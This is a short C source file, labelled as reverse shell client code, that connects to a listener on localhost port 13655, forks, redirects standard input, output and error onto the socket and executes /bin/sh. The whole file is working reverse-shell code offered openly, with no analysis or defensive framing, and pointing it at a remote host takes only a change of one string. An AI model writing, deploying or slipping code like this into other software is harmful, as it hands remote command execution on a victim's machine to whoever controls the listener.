// reverse shell client code

#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netdb.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/sendfile.h>
#include <string.h>

int portno = 13655;



void error(char *msg){
    perror(msg);
    exit(0);
}

int main(){
    int sockfd, n;
    struct sockaddr_in serv_addr;
    struct hostent *server;   // struct to contain info about host

    char buffer[1024];

    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if(sockfd < 0){
        error("Error, while opening socker\n");
    }

    server = gethostbyname("localhost");

    bzero((char*)&serv_addr, sizeof(serv_addr));
    
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(portno);
    bcopy((char *)server->h_addr, (char *)&serv_addr.sin_addr.s_addr,server->h_length);
    

    if (connect(sockfd,(struct sockaddr_in*)&serv_addr,sizeof(serv_addr)) < 0) 
        error("ERROR connecting");

    pid_t pid = fork();
    if(pid < 0){
        error("Error, Could not create new process!\n");
    }
    else if(pid == 0){
        dup2(sockfd, 1);
        dup2(sockfd, 2);
        dup2(sockfd, 0);
        execl("/bin/sh","/bin/sh",NULL);  // become orphan process
    }
}